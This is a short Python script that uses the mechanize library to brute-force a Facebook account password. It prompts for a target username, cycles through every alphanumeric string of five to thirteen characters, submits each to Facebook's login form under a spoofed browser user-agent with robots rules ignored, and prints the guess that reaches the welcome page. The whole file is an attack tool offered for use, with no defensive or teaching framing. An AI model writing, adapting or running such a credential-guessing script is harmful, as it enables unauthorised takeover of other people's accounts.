import os
import sys
import time
import string
import itertools
import mechanize

# Configuration
timeout_seconds = 0
username = input("Enter username: ")
url = 'https://www.facebook.com/'
valid_password = 'ZZZZZZZ999999'

# Mechanize setup
br = mechanize.Browser()
br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36')]
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

def inject_byte01(valid_password):
    try:
        chars = string.ascii_letters + string.digits
        for passw_length in range(5, 14):
            for guess in itertools.product(chars, repeat=passw_length):
                time.sleep(timeout_seconds)
                guess = ''.join(guess)
                br.open(url)
                br.select_form(nr=0)
                br.form['email'] = username
                br.form['pass'] = guess
                submission = br.submit()
                print('{}, {}, {}'.format(guess, submission, submission.geturl()))
                if submission.geturl() == 'https://www.facebook.com/?sk=welcome' or guess == valid_password:
                    print('~{}'.format(guess))
                    return
    except Exception as e:
        print(f"An error occurred: {e}")

# Execute the brute-force attack
inject_byte01(valid_password)

sys.exit()
